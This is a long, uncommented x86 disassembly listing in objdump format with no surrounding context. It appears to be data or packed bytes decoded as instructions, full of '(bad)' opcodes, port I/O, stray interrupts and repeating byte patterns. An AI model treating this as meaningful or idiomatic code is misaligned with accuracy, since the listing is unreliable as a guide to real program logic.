  4262b5:	add    BYTE PTR [eax-0x7fca69a3],0x80
  4262bc:	mov    eax,0x4b0760a
  4262c1:	ins    DWORD PTR es:[edi],dx
  4262c2:	(bad)  
  4262c3:	mov    eax,0xcda2760a
  4262c8:	sar    DWORD PTR [eax+0x5d15760a],cl
  4262ce:	(bad)  
  4262cf:	xor    eax,0xf1cd8080
  4262d4:	mov    eax,0xcf19960a
  4262d9:	nop
  4262da:	xchg   edx,eax
  4262db:	iret   
  4262dc:	sahf   
  4262dd:	(bad)  
  4262de:	int    0x99
  4262e0:	mov    eax,0xcd1d960a
  4262e5:	aad    0xb8
  4262e7:	or     dl,BYTE PTR [esi-0x662dfbdf]
  4262ed:	mov    eax,0xcf01960a
  4262f2:	jno    0x426348
  4262f4:	int    0x3
  4262f6:	mov    eax,0x40be60a
  4262fb:	leave  
  4262fc:	xchg   ebp,eax
  4262fd:	mov    eax,0xcf05e60a
  426302:	ficomp WORD PTR [eax-0x48]
  426305:	or     ah,dh
  426307:	pop    es
  426308:	mov    eax,0xb809760a
  42630d:	or     dl,dh
  42630f:	retf   0xc5cd
  426312:	mov    eax,0xb8cc760a
  426317:	or     dl,BYTE PTR [edi]
  426319:	ins    BYTE PTR es:[edi],dx
  42631a:	add    BYTE PTR [eax],al
  42631c:	add    BYTE PTR [ebp*2+0x60ab8d0],al
  426323:	push   edx
  426324:	add    BYTE PTR [eax],al
  426326:	add    bh,cl
  426328:	outs   dx,BYTE PTR ds:[esi]
  426329:	add    edi,DWORD PTR [eax+0x74060a]
  42632f:	add    BYTE PTR [eax],al
  426331:	add    al,0x6d
  426333:	inc    edx
  426334:	mov    eax,0x78060a
  426339:	add    BYTE PTR [eax],al
  42633b:	iret   
  42633c:	outs   dx,BYTE PTR ds:[esi]
  42633d:	xor    BYTE PTR [eax+0x7c060a],bh
  426343:	add    BYTE PTR [eax],al
  426345:	add    al,0x6d
  426347:	xor    bh,BYTE PTR [eax+0x8a060a]
  42634d:	add    BYTE PTR [eax],al
  42634f:	mov    eax,0x8ccf0a
  426354:	add    BYTE PTR [eax],al
  426356:	int    0xc5
  426358:	mov    eax,0x8e060a
  42635d:	add    BYTE PTR [eax],al
  42635f:	int    0x76
  426361:	in     eax,dx
  426362:	int    0x8d
  426364:	adc    DWORD PTR [edi],ebp
  426366:	inc    ebp
  426367:	jge    0x4262fb
  426369:	shr    ebx,cl
  42636b:	xchg   edx,eax
  42636c:	int    0x8d
  42636e:	in     eax,dx
  42636f:	int    0x96
  426371:	adc    ebx,eax
  426373:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426374:	mov    esi,0xc93b4229
  426379:	cmp    ebx,edx
  42637b:	shl    edx,cl
  42637d:	sub    BYTE PTR [ebx-0x2e],dl
  426380:	in     al,dx
  426381:	outs   dx,BYTE PTR ds:[esi]
  426382:	iret   
  426383:	aam    0x76
  426385:	mov    al,0xb8
  426387:	int    0x4e
  426389:	das    
  42638a:	mov    ebx,0xcbbb2f18
  42638f:	cmp    ecx,DWORD PTR [edx+edx*1]
  426392:	sti    
  426393:	and    DWORD PTR ds:0xf3e38080,esi
  426399:	shl    edx,cl
  42639b:	das    
  42639c:	push   ebx
  42639d:	adc    ecx,DWORD PTR [ecx]
  42639f:	int3   
  4263a0:	test   DWORD PTR [ebp-0x32ffff01],esp
  4263a6:	lea    esi,[ebp+0x2fbd96cd]
  4263ac:	inc    ebp
  4263ad:	jecxz  0x426341
  4263af:	shl    ebx,cl
  4263b1:	xchg   edx,eax
  4263b2:	int    0x96
  4263b4:	mov    ch,0xcd
  4263b6:	(bad)  
  4263b7:	mov    ebp,0xf73bf03b
  4263bc:	push   ebx
  4263bd:	psrlq  mm5,mm2
  4263c0:	sub    BYTE PTR [edi-0x7906fb2d],al
  4263c6:	(bad)  
  4263c7:	popa   
  4263c8:	int    0x76
  4263ca:	in     eax,dx
  4263cb:	int    0x8d
  4263cd:	adc    DWORD PTR [edi],ebp
  4263cf:	inc    ebp
  4263d0:	jge    0x426364
  4263d2:	shr    ebx,cl
  4263d4:	xchg   edx,eax
  4263d5:	int    0x8d
  4263d7:	in     eax,dx
  4263d8:	int    0x96
  4263da:	adc    DWORD PTR [ebx],edi
  4263dc:	leave  
  4263dd:	cmp    ebx,edx
  4263df:	shl    edx,cl
  4263e1:	sub    BYTE PTR [ebx-0x2e],dl
  4263e4:	in     al,dx
  4263e5:	outs   dx,BYTE PTR ds:[esi]
  4263e6:	iret   
  4263e7:	aam    0x76
  4263e9:	add    DWORD PTR [eax-0x44d0b133],edi
  4263ef:	sbb    BYTE PTR [edi],ch
  4263f1:	mov    ebx,0x120c3bcb
  4263f6:	sti    
  4263f7:	and    DWORD PTR ds:0xf3e38080,esi
  4263fd:	shl    edx,cl
  4263ff:	das    
  426400:	push   ebx
  426401:	adc    ecx,DWORD PTR [ecx]
  426403:	int3   
  426404:	test   esp,ecx
  426406:	inc    DWORD PTR [eax]
  426408:	add    ch,cl
  42640a:	lea    esi,[ebp+0x2fbd96cd]
  426410:	inc    ebp
  426411:	jecxz  0x4263a5
  426413:	shl    ebx,cl
  426415:	xchg   edx,eax
  426416:	int    0x96
  426418:	mov    ch,0xcd
  42641a:	(bad)  
  42641b:	mov    ebp,0xf73bf03b
  426420:	push   ebx
  426421:	psrlq  mm5,mm2
  426424:	sub    BYTE PTR [edi-0x7406fb2d],al
  42642a:	(bad)  
  42642b:	popa   
  42642c:	int    0x76
  42642e:	in     eax,dx
  42642f:	int    0x8d
  426431:	adc    DWORD PTR [edi],ebp
  426433:	inc    ebp
  426434:	jge    0x4263c8
  426436:	shr    ebx,cl
  426438:	xchg   edx,eax
  426439:	int    0x8d
  42643b:	in     eax,dx
  42643c:	int    0x96
  42643e:	adc    DWORD PTR [ebx],edi
  426440:	leave  
  426441:	cmp    ebx,edx
  426443:	shl    edx,cl
  426445:	sub    BYTE PTR [ebx-0x2e],dl
  426448:	in     al,dx
  426449:	je     0x42641a
  42644b:	push   ebp
  42644c:	jbe    0x4264ba
  42644e:	add    BYTE PTR [eax],al
  426450:	add    BYTE PTR [eax-0x44d0b133],bh
  426456:	sbb    BYTE PTR [edi],ch
  426458:	mov    ebx,0x120c3bcb
  42645d:	sti    
  42645e:	and    DWORD PTR ds:0xf3e38080,esi
  426464:	shl    edx,cl
  426466:	das    
  426467:	push   ebx
  426468:	adc    ecx,DWORD PTR [ecx]
  42646a:	int3   
  42646b:	test   DWORD PTR ds:0xcd0000ff,eax
  426471:	lea    esi,[ebp+0x2fbd96cd]
  426477:	inc    ebp
  426478:	jecxz  0x42640c
  42647a:	shl    ebx,cl
  42647c:	xchg   edx,eax
  42647d:	int    0x96
  42647f:	mov    ch,0xcd
  426481:	(bad)  
  426482:	mov    ebp,0xf73bf03b
  426487:	push   ebx
  426488:	psrlq  mm5,mm2
  42648b:	sub    BYTE PTR [edi-0x7706fb2d],al
  426491:	(bad)  
  426492:	mov    ebx,0xffb506cf
  426497:	add    BYTE PTR [eax],al
  426499:	or     dh,BYTE PTR [esi-0x7]
  42649c:	int    0x76
  42649e:	stc    
  42649f:	pop    edi
  4264a0:	inc    esi
  4264a1:	pop    esp
  4264a2:	inc    ebp
  4264a3:	xchg   edi,eax
  4264a4:	or     cl,BYTE PTR [eax+0x79245161]
  4264aa:	daa    
  4264ab:	or     dh,BYTE PTR [eax-0x7c]
  4264ae:	int    0x6
  4264b0:	mov    ch,0xff
  4264b2:	add    BYTE PTR [eax],al
  4264b4:	int    0x57
  4264b6:	mov    ebp,0xa0000ff
  4264bb:	(bad)  
  4264bc:	mov    ebp,0x8621d169
  4264c1:	xor    eax,0x62fd343
  4264c6:	pusha  
  4264c7:	add    DWORD PTR [eax-0x4269a180],0x8151062f
  4264d1:	add    BYTE PTR [eax-0x7fca76a3],0x80
  4264d8:	mov    eax,0xfff9060a
  4264dd:	add    BYTE PTR [eax],al
  4264df:	int    0xc5
  4264e1:	mov    eax,0xff03060a
  4264e6:	add    BYTE PTR [eax],al
  4264e8:	pop    ebp
  4264e9:	es xor eax,0xab88080
  4264ef:	push   es
  4264f0:	std    
  4264f1:	inc    DWORD PTR [eax]
  4264f3:	add    BYTE PTR [ebp-0x5d],bl
  4264f6:	xor    eax,0xab88080
  4264fb:	push   es
  4264fc:	(bad)  
  4264fd:	inc    DWORD PTR [eax]
  4264ff:	add    BYTE PTR [ebp+0x1e],bl
  426502:	xor    eax,0xab88080
  426507:	push   es
  426508:	add    BYTE PTR [eax],0x0
  42650b:	add    BYTE PTR [ebp*2-0x47823218],al
  426512:	or     cl,bh
  426514:	xchg   edx,eax
  426515:	add    BYTE PTR [eax],al
  426517:	add    ch,cl
  426519:	jbe    0x42654b
  42651b:	pop    edi
  42651c:	dec    ebx
  42651d:	xor    eax,0xab88080
  426522:	iret   
  426523:	test   BYTE PTR [eax],al
  426525:	add    BYTE PTR [eax],al
  426527:	add    al,0xd3
  426529:	bound  edi,QWORD PTR [eax+0x86cf0a]
  42652f:	add    BYTE PTR [eax],al
  426531:	pop    edi
  426532:	push   esi
  426533:	xor    eax,0xab88080
  426538:	iret   
  426539:	mov    BYTE PTR [eax],al
  42653b:	add    BYTE PTR [eax],al
  42653d:	add    al,0xd3
  42653f:	pushf  
  426540:	mov    eax,0x4acf0a
  426545:	add    BYTE PTR [eax],al
  426547:	int    0xc
  426549:	mov    eax,0x4ccf0a
  42654e:	add    BYTE PTR [eax],al
  426550:	pop    edi
  426551:	add    al,0x35
  426553:	add    BYTE PTR [eax+0x4ecf0ab8],0x0
  42655a:	add    BYTE PTR [eax],al
  42655c:	cmp    edi,DWORD PTR [ecx+0x5f]
  42655f:	adc    DWORD PTR [eax-0x80],edx
  426562:	cmp    BYTE PTR [eax+0x30cf0a],0x0
  426569:	add    bl,dl
  42656b:	mov    ebp,0x151a5f92
  426570:	add    BYTE PTR [eax+0x22cf0ab8],0x0
  426577:	add    BYTE PTR [eax],al
  426579:	pop    edi
  42657a:	call   0xcf0a:0xb88080eb
  426581:	adc    al,0x0
  426583:	add    BYTE PTR [eax],al
  426585:	int    0x8d
  426587:	xor    BYTE PTR [edx+eax*1],al
  42658a:	call   ebx
  42658c:	repnz sub BYTE PTR [ebx-0x2d],dl
  426590:	or     al,BYTE PTR [esi]
  426592:	adc    eax,0xcd0000ff
  426597:	jbe    0x4265e5
  426599:	int    0x8d
  42659b:	dec    esp
  42659c:	cmp    edi,DWORD PTR [ecx-0x2d]
  42659f:	mov    ebp,0xff020492
  4265a4:	shl    edx,cl
  4265a6:	sub    BYTE PTR [ebx-0x2d],dl
  4265a9:	leave  
  4265aa:	add    eax,0xff1d06
  4265af:	add    BYTE PTR [eax],al
  4265b1:	add    BYTE PTR [eax+0x1506cf80],al
  4265b7:	inc    DWORD PTR [eax]
  4265b9:	add    BYTE PTR [eax-0x33],dh
  4265bc:	jbe    0x4265ee
  4265be:	int    0x8d
  4265c0:	xor    BYTE PTR [ebx],bh
  4265c2:	jns    0x426597
  4265c4:	mov    ebp,0xff020492
  4265c9:	shl    edx,cl
  4265cb:	sub    BYTE PTR [ebx-0x2d],dl
  4265ce:	jo     0x42659f
  4265d0:	push   es
  4265d1:	stc    
  4265d2:	inc    DWORD PTR [eax]
  4265d4:	add    BYTE PTR [eax-0x33],dh
  4265d7:	jbe    0x4265ce
  4265d9:	int    0x1
  4265db:	cmp    eax,0xc9808081
  4265e0:	push   es
  4265e1:	sbb    BYTE PTR [eax],al
  4265e3:	add    BYTE PTR [eax],al
  4265e5:	inc    eax
  4265e6:	retf   
  4265e7:	fwait
  4265e8:	xor    eax,0x76cd5000
  4265ed:	adc    al,0x0
  4265ef:	icebp  
  4265f0:	or     dh,BYTE PTR [esi-0x7]
  4265f3:	int    0x76
  4265f5:	stc    
  4265f6:	push   es
  4265f7:	ins    DWORD PTR es:[edi],dx
  4265f8:	aam    0x4a
  4265fa:	adc    dl,BYTE PTR [esi+0x68]
  4265fd:	or     BYTE PTR [ebx+ecx*1],bl
  426600:	fmul   QWORD PTR [ebx-0x17]
  426603:	(bad)  
  426604:	int    0x8d
  426606:	dec    esp
  426607:	int    0x96
  426609:	dec    esp
  42660a:	sar    bh,0x3b
  42660d:	setl   BYTE PTR [ebx]
  426610:	icebp  
  426611:	shr    edx,cl
  426613:	sub    bl,dl
  426615:	jmp    0x4265a9
  426617:	push   ebx
  426618:	adc    ecx,ebp
  42661a:	xchg   esi,eax
  42661b:	cmc    
  42661c:	int    0xa2
  42661e:	and    eax,0x5e808081
  426623:	dec    edx
  426624:	das    
  426625:	push   es
  426626:	popa   
  426627:	test   DWORD PTR [eax+0x4c8dcd80],eax
  42662d:	int    0x96
  42662f:	dec    esp
  426630:	cmp    ecx,DWORD PTR [edi]
  426632:	shr    ebx,cl
  426634:	xchg   edx,eax
  426635:	cmp    esi,ecx
  426637:	shr    edx,cl
  426639:	sub    BYTE PTR [ebx+0x13],dl
  42663c:	int    0x96
  42663e:	cmc    
  42663f:	int    0xa2
  426641:	in     al,0x81
  426643:	add    BYTE PTR [eax-0x7232b5f6],0x4c
  42664a:	int    0x96
  42664c:	dec    esp
  42664d:	cmp    ecx,DWORD PTR [edi]
  42664f:	shr    ebx,cl
  426651:	xchg   edx,eax
  426652:	cmp    esi,ecx
  426654:	shr    edx,cl
  426656:	sub    BYTE PTR [ebx+0x13],dl
  426659:	int    0x96
  42665b:	cmc    
  42665c:	int    0xa2
  42665e:	add    DWORD PTR [ecx+0x4a0a8080],eax
  426664:	pop    edi
  426665:	xor    ax,0x8080
  426669:	mov    eax,0x24cf0a
  42666e:	add    BYTE PTR [eax],al
  426670:	int    0xc
  426672:	mov    eax,0x28cf0a
  426677:	add    BYTE PTR [eax],al
  426679:	pop    edi
  42667a:	es xor eax,0xab88080
  426680:	iret   
  426681:	sub    al,0x0
  426683:	add    BYTE PTR [eax],al
  426685:	pop    edi
  426686:	daa    
  426687:	xor    eax,0xab88080
  42668c:	iret   
  42668d:	xor    al,BYTE PTR [eax]
  42668f:	add    BYTE PTR [eax],al
  426691:	add    al,0xd3
  426693:	test   eax,0x34cf0ab8
  426698:	add    BYTE PTR [eax],al
  42669a:	add    BYTE PTR [edi-0x69],bl
  42669d:	xor    eax,0xab88080
  4266a2:	iret   
  4266a3:	cmp    BYTE PTR [eax],al
  4266a5:	add    BYTE PTR [eax],al
  4266a7:	add    al,0xd3
  4266a9:	mov    dl,0xb8
  4266ab:	or     cl,bh
  4266ad:	cmp    al,0x0
  4266af:	add    BYTE PTR [eax],al
  4266b1:	pop    edi
  4266b2:	fwait
  4266b3:	xor    eax,0xab88080
  4266b8:	iret   
  4266b9:	inc    eax
  4266ba:	add    BYTE PTR [eax],al
  4266bc:	add    ch,cl
  4266be:	or     al,0xb8
  4266c0:	or     cl,bh
  4266c2:	inc    esp
  4266c3:	add    BYTE PTR [eax],al
  4266c5:	add    BYTE PTR [edi+0x17],bl
  4266c8:	xor    eax,0xab88080
  4266cd:	iret   
  4266ce:	dec    eax
  4266cf:	add    BYTE PTR [eax],al
  4266d1:	add    BYTE PTR [edi+0x26],bl
  4266d4:	pop    esi
  4266d5:	add    BYTE PTR [eax+0x50cf0ab8],0x0
  4266dc:	add    BYTE PTR [eax],al
  4266de:	pop    edi
  4266df:	cmp    esi,DWORD PTR [edx]
  4266e1:	add    BYTE PTR [eax+0x42cf0ab8],0x0
  4266e8:	add    BYTE PTR [eax],al
  4266ea:	jns    0x426762
  4266ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4266ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266ee:	pop    edi
  4266ef:	pop    esp
  4266f0:	adc    eax,0xab88080
  4266f5:	iret   
  4266f6:	push   esp
  4266f7:	add    BYTE PTR [eax],al
  4266f9:	add    BYTE PTR [ebx+edx*8],al
  4266fc:	pop    esp
  4266fd:	mov    eax,0x58cf0a
  426702:	add    BYTE PTR [eax],al
  426704:	jns    0x42677c
  426706:	fisttp WORD PTR [ecx+0x79]
  426709:	jbe    0x4266b4
  42670b:	inc    ecx
  42670c:	jns    0x426784
  42670e:	loope  0x4266b3
  426710:	pop    edi
  426711:	fcom   st(4)
  426713:	add    BYTE PTR [eax+0x5ccf0ab8],0x0
  42671a:	add    BYTE PTR [eax],al
  42671c:	jns    0x426794
  42671e:	lods   eax,DWORD PTR ds:[esi]
  42671f:	push   edi
  426720:	pop    edi
  426721:	jnp    0x426778
  426723:	add    BYTE PTR [eax+0x60cf0ab8],0x0
  42672a:	add    BYTE PTR [eax],al
  42672c:	jns    0x4267a4
  42672e:	repnz cmp DWORD PTR [ecx+0x76],edi
  426732:	jmp    0x8080:0x35a15f47
  426739:	mov    eax,0x64cf0a
  42673e:	add    BYTE PTR [eax],al
  426740:	jns    0x4267b8
  426742:	in     eax,0x18
  426744:	int    0x8d
  426746:	xor    ch,cl
  426748:	xchg   esi,eax
  426749:	xor    BYTE PTR [ebx],bh
  42674b:	(bad)  
  42674d:	icebp  
  42674e:	shr    ebx,cl
  426750:	xchg   edx,eax
  426751:	shr    edx,cl
  426753:	sub    BYTE PTR [ebx+0x13],dl
  426756:	in     al,dx
  426757:	xchg   esp,eax
  426758:	int    0x96
  42675a:	xor    ch,cl
  42675c:	out    0x30,al
  42675e:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  426764:	stc    
  426765:	shr    ecx,cl
  426767:	sub    BYTE PTR [ebx-0x27],dl
  42676a:	xor    edx,DWORD PTR [ebx]
  42676c:	das    
  42676d:	pop    ecx
  42676e:	mov    WORD PTR [ebp-0x5b],cs
  426771:	int    0x96
  426773:	xor    ch,cl
  426775:	out    0x30,al
  426777:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42677d:	stc    
  42677e:	shr    ecx,cl
  426780:	sub    BYTE PTR [ebx-0x27],dl
  426783:	int    0xe6
  426785:	stc    
  426786:	add    al,0x2
  426788:	adc    DWORD PTR [edx],0xffffffd3
  42678b:	fwait
  42678c:	add    BYTE PTR [eax+0x9033380],0x8c
  426793:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  426795:	int    0x96
  426797:	xor    ch,cl
  426799:	lea    esi,[eax]
  42679b:	cmp    ebx,DWORD PTR [ecx-0xd2c82c5]
  4267a1:	sub    bl,dl
  4267a3:	repz xchg edx,eax
  4267a5:	push   ebx
  4267a6:	jecxz  0x426775
  4267a8:	(bad)  
  4267a9:	stc    
  4267aa:	xchg   DWORD PTR [ebx],edx
  4267ac:	int    0x96
  4267ae:	xor    ch,cl
  4267b0:	out    0x30,al
  4267b2:	cmp    ebx,DWORD PTR [ecx-0xc2c06c5]
  4267b8:	xchg   edx,eax
  4267b9:	shr    ecx,cl
  4267bb:	sub    BYTE PTR [ebx-0x27],dl
  4267be:	add    al,0xd2
  4267c0:	mov    BYTE PTR [edx],cl
  4267c2:	(bad)  
  4267c3:	stc    
  4267c4:	inc    ebx
  4267c5:	adc    eax,DWORD PTR [edx+0x308dcdb0]
  4267cb:	int    0x96
  4267cd:	xor    BYTE PTR [ebx],bh
  4267cf:	(bad)  
  4267d1:	icebp  
  4267d2:	shr    ebx,cl
  4267d4:	xchg   edx,eax
  4267d5:	shr    edx,cl
  4267d7:	sub    BYTE PTR [ebx+0x13],dl
  4267da:	or     cl,bh
  4267dc:	adc    eax,0xcd0000ff
  4267e1:	lea    ecx,[ebp+ecx*8-0x6a]
  4267e5:	dec    esp
  4267e6:	cmp    ecx,DWORD PTR [edi]
  4267e8:	cmp    esi,ecx
  4267ea:	shr    edx,cl
  4267ec:	sub    bl,dl
  4267ee:	jmp    0x426782
  4267f0:	push   ebx
  4267f1:	adc    ecx,edi
  4267f3:	xchg   esi,eax
  4267f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4267f5:	or     dl,BYTE PTR ds:0xff1dcf
  4267fb:	add    BYTE PTR [ecx+0x6b],ah
  4267fe:	xor    eax,0x13cd8080
  426803:	mov    eax,0x4258d0a
  426808:	rcl    edx,cl
  42680a:	int    0xfa
  42680c:	mov    eax,0xcf29e60a
  426811:	loopne 0x4267bc
  426813:	mov    eax,0x42de60a
  426818:	leave  
  426819:	test   BYTE PTR [eax-0x304d19f6],bh
  42681f:	loopne 0x426835
  426821:	mov    eax,0x435e60a
  426826:	leave  
  426827:	loop   0x4267e1
  426829:	or     ah,dh
  42682b:	cmp    ebp,ecx
  42682d:	cli    
  42682e:	mov    eax,0xcd3de60a
  426833:	add    edi,DWORD PTR [eax-0x32be19f6]
  426839:	cld    
  42683a:	mov    eax,0xcd45e60a
  42683f:	add    edi,DWORD PTR [eax-0x322f19f6]
  426845:	cli    
  426846:	mov    eax,0xcfc2e60a
  42684b:	loopne 0x426876
  42684d:	mov    eax,0x455e60a
  426852:	leave  
  426853:	test   BYTE PTR [eax-0x30a619f6],bh
  426859:	loopne 0x4267f0
  42685b:	mov    eax,0x45de60a
  426860:	leave  
  426861:	loop   0x42681b
  426863:	or     ah,dh
  426865:	popa   
  426866:	mov    eax,0xb8658d0a
  42686b:	or     dl,BYTE PTR [esi-0x47f33297]
  426871:	or     cl,BYTE PTR [ebp+0x4c8dcd6d]
  426877:	int    0x96
  426879:	dec    esp
  42687a:	cmp    esi,ecx
  42687c:	cmp    ecx,DWORD PTR [edi]
  42687e:	shr    edx,cl
  426880:	sub    bl,dl
  426882:	jmp    0x426816
  426884:	push   ebx
  426885:	adc    ecx,ebp
  426887:	xchg   esi,eax
  426888:	dec    esp
  426889:	int    0xe6
  42688b:	dec    esp
  42688c:	cmp    ebx,DWORD PTR [ecx-0x306d0c2d]
  426892:	mov    WORD PTR [ebp-0x2c06c430],cs
  426898:	jmp    0x301bbbc5
  42689d:	mov    ebx,0xb8d93b5e
  4268a2:	or     dh,BYTE PTR [ecx]
  4268a4:	int    0x8d
  4268a6:	dec    esp
  4268a7:	int    0x96
  4268a9:	dec    esp
  4268aa:	cmp    ecx,DWORD PTR [edi]
  4268ac:	cmp    esi,ecx
  4268ae:	shr    ebx,cl
  4268b0:	xchg   edx,eax
  4268b1:	shr    edx,cl
  4268b3:	sub    BYTE PTR [ebx+0x13],dl
  4268b6:	int    0x96
  4268b8:	dec    esp
  4268b9:	iret   
  4268ba:	mov    WORD PTR [ebp-0x3266c4db],cs
  4268c0:	out    0x4c,al
  4268c2:	shl    ebx,cl
  4268c4:	xchg   edx,eax
  4268c5:	cmp    edi,ecx
  4268c7:	shr    ecx,cl
  4268c9:	sub    BYTE PTR [ebx-0x27],dl
  4268cc:	das    
  4268cd:	mov    ebx,0xb8d93b5e
  4268d2:	or     dh,BYTE PTR [ecx]
  4268d4:	int    0x8d
  4268d6:	dec    esp
  4268d7:	int    0x96
  4268d9:	dec    esp
  4268da:	cmp    esi,ecx
  4268dc:	shr    edx,cl
  4268de:	sub    BYTE PTR [ebx],bh
  4268e0:	psrlq  mm5,mm3
  4268e3:	xchg   edx,eax
  4268e4:	push   ebx
  4268e5:	adc    ecx,ebp
  4268e7:	xchg   esi,eax
  4268e8:	dec    esp
  4268e9:	int    0xe6
  4268eb:	dec    esp
  4268ec:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  4268f2:	stc    
  4268f3:	shr    ecx,cl
  4268f5:	sub    BYTE PTR [ebx-0x27],dl
  4268f8:	mov    eax,0x9096cc0a
  4268fd:	inc    DWORD PTR [eax]
  4268ff:	add    ch,cl
  426901:	lea    ecx,[ebp+ecx*8-0x6a]
  426905:	dec    esp
  426906:	cmp    esi,ecx
  426908:	shr    edx,cl
  42690a:	sub    BYTE PTR [ebx],bh
  42690c:	psrlq  mm5,mm3
  42690f:	xchg   edx,eax
  426910:	push   ebx
  426911:	adc    ecx,ebp
  426913:	xchg   esi,eax
  426914:	dec    esp
  426915:	int    0xe6
  426917:	dec    esp
  426918:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42691e:	stc    
  42691f:	shr    ecx,cl
  426921:	sub    BYTE PTR [ebx-0x27],dl
  426924:	mov    eax,0xa496cc0a
  426929:	inc    DWORD PTR [eax]
  42692b:	add    ch,cl
  42692d:	lea    esi,[eax]
  42692f:	int    0x96
  426931:	xor    BYTE PTR [ebx],bh
  426933:	icebp  
  426934:	cmp    ecx,DWORD PTR [edi]
  426936:	shr    edx,cl
  426938:	sub    bl,dl
  42693a:	jmp    0x4268ce
  42693c:	push   ebx
  42693d:	adc    ecx,ebp
  42693f:	xchg   esi,eax
  426940:	xor    ch,cl
  426942:	out    0x30,al
  426944:	cmp    ebx,DWORD PTR [ecx-0xc2c06c5]
  42694a:	xchg   edx,eax
  42694b:	shr    ecx,cl
  42694d:	sub    BYTE PTR [ebx-0x27],dl
  426950:	xchg   DWORD PTR [ebx],edx
  426952:	or     cl,bh
  426954:	adc    eax,0xcd0000ff
  426959:	lea    ecx,[ebp+ecx*8-0x6a]
  42695d:	dec    esp
  42695e:	int    0xe6
  426960:	mov    BYTE PTR [ebx],bh
  426962:	icebp  
  426963:	cmp    ecx,DWORD PTR [edi]
  426965:	shr    ebx,cl
  426967:	xchg   edx,eax
  426968:	shr    edx,cl
  42696a:	sub    BYTE PTR [ebx+0x13],dl
  42696d:	iret   
  42696e:	push   es
  42696f:	nop
  426970:	inc    DWORD PTR [eax]
  426972:	add    BYTE PTR [edx],cl
  426974:	add    eax,0xff1dcf
  426979:	add    bh,cl
  42697b:	jbe    0x42694d
  42697d:	mov    ebp,0x10d8
  426982:	int    0x8d
  426984:	xor    ch,cl
  426986:	xchg   esi,eax
  426987:	xor    al,al
  426989:	(bad)  
  42698a:	cmp    ecx,DWORD PTR [edi]
  42698c:	stos   BYTE PTR es:[edi],al
  42698d:	cmp    ebx,ecx
  42698f:	shr    ebx,cl
  426991:	xchg   edx,eax
  426992:	shr    edx,cl
  426994:	sub    BYTE PTR [ebx+0x13],dl
  426997:	or     al,BYTE PTR ds:0xff1dcf
  42699d:	add    ch,cl
  42699f:	jbe    0x4269ed
  4269a1:	int    0x8d
  4269a3:	dec    esp
  4269a4:	cmp    edi,DWORD PTR [ecx-0x2d]
  4269a7:	mov    ebp,0xd3f03b92
  4269ac:	repnz sub BYTE PTR [ebx-0x2d],dl
  4269b0:	aam    0x3c
  4269b2:	iret   
  4269b3:	push   es
  4269b4:	adc    eax,0x700000ff
  4269b9:	int    0x76
  4269bb:	xor    ch,cl
  4269bd:	lea    esi,[eax]
  4269bf:	cmp    edi,DWORD PTR [ecx-0x2d]
  4269c2:	mov    ebp,0xd3f03b92
  4269c7:	repnz sub BYTE PTR [ebx-0x2d],dl
  4269cb:	jo     0x42699c
  4269cd:	push   es
  4269ce:	and    al,0x0
  4269d0:	add    BYTE PTR [eax],al
  4269d2:	jo     0x4269a1
  4269d4:	jbe    0x4269ea
  4269d6:	rol    BYTE PTR [eax+0x76cdf100],0x4c
  4269dd:	int    0x8d
  4269df:	dec    esp
  4269e0:	cmp    edi,DWORD PTR [ecx+0x3b]
  4269e3:	lock int 0xe6
  4269e6:	mov    bl,dl
  4269e8:	mov    ebp,0x28f2d392
  4269ed:	push   ebx
  4269ee:	ror    edi,cl
  4269f0:	iret   
  4269f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4269f2:	inc    DWORD PTR [eax]
  4269f4:	add    BYTE PTR [edx],cl
  4269f6:	int3   
  4269f7:	push   es
  4269f8:	sbb    eax,0xcf0000ff
  4269fd:	jbe    0x426a24
  4269ff:	mov    ebp,0xeff5
  426a04:	int    0x8d
  426a06:	xor    ch,cl
  426a08:	xchg   esi,eax
  426a09:	xor    BYTE PTR [ebx],bh
  426a0b:	psrlq  mm5,mm3
  426a0e:	xchg   edx,eax
  426a0f:	add    al,0xfb
  426a11:	call   ebx
  426a13:	jmp    0xcf05:0xa135328
  426a1a:	sbb    eax,0x610000ff
  426a1f:	sub    esi,DWORD PTR ds:0x6a5d8080
  426a25:	xor    eax,0xab88080
  426a2a:	push   es
  426a2b:	jo     0x426a2d
  426a2d:	add    BYTE PTR [eax],al
  426a2f:	iret   
  426a30:	mov    dh,BYTE PTR [eax]
  426a32:	mov    eax,0xb4cf0a
  426a37:	add    BYTE PTR [eax],al
  426a39:	pop    ebp
  426a3a:	adc    BYTE PTR ds:0xab88080,dh
  426a40:	push   es
  426a41:	bound  eax,QWORD PTR [eax]
  426a43:	add    BYTE PTR [eax],al
  426a45:	int    0xd2
  426a47:	mov    eax,0x94060a
  426a4c:	add    BYTE PTR [eax],al
  426a4e:	int    0xd3
  426a50:	mov    eax,0x98060a
  426a55:	add    BYTE PTR [eax],al
  426a57:	add    al,0x6d
  426a59:	sub    ch,cl
  426a5b:	jge    0x426a15
  426a5d:	or     cl,bh
  426a5f:	mov    eax,0xcf000000
  426a64:	mov    ch,BYTE PTR [eax]
  426a66:	mov    eax,0xbccf0a
  426a6b:	add    BYTE PTR [eax],al
  426a6d:	add    al,0xd3
  426a6f:	pusha  
  426a70:	mov    eax,0xc0cf0a
  426a75:	add    BYTE PTR [eax],al
  426a77:	iret   
  426a78:	mov    cl,BYTE PTR [edx-0x48]
  426a7b:	or     cl,bh
  426a7d:	les    eax,FWORD PTR [eax]
  426a7f:	add    BYTE PTR [eax],al
  426a81:	int    0xf9
  426a83:	mov    eax,0x9c670a
  426a88:	add    BYTE PTR [eax],al
  426a8a:	iret   
  426a8b:	loopne 0x426a2d
  426a8d:	pop    edi
  426a8e:	add    BYTE PTR ds:0xab88080,dh
  426a94:	iret   
  426a95:	enter  0x0,0x0
  426a99:	iret   
  426a9a:	mov    bh,bh
  426a9c:	mov    eax,0x90cf0a
  426aa1:	add    BYTE PTR [eax],al
  426aa3:	mov    eax,0xa0670a
  426aa8:	add    BYTE PTR [eax],al
  426aaa:	add    al,0xc9
  426aac:	stc    
